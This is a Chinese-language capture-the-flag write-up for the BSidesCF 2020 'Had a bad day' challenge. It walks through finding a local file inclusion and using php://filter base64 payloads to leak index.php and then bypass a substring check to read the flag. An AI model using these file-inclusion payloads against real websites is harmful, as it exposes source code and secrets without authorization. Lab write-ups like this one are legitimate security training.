# [BSidesCF 2020]Had a bad day 1

- 进入网页，点击 `woofers` 出现一张狗狗的照片，~~可爱捏~~，在url栏发现GET传参

> <img src="../../IMG3/Screenshot 2024-06-16 191746.png">

- 可能存在Sql注入或者文件包含漏洞，经过尝试后，发现是文件包含漏洞

> <img src="../../IMG3/Screenshot 2024-06-16 191950.png">

- 首先使用伪协议查看 `index.php` 的源码，注意这里已经添加了后缀 `.php`

`?category=php://filter/convert.base64-encode/resource=index`

```php
<?php
$file = $_GET['category'];

if(isset($file))
{
	if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
		include ($file . '.php');
	}
	else{
		echo "Sorry, we currently only support woofers and meowers.";
	}
}
?>
```

- 可以看出这道题的文件名中必须包含 `woofers` 、 `meowers` 或者 `index` ，payload如下

`?category=php://filter/convert.base64-encode/index/resource=flag`

> <img src="../../IMG3/Screenshot 2024-06-16 192848.png">

- 解码得到flag

> <img src="../../IMG3/Screenshot 2024-06-16 192939.png">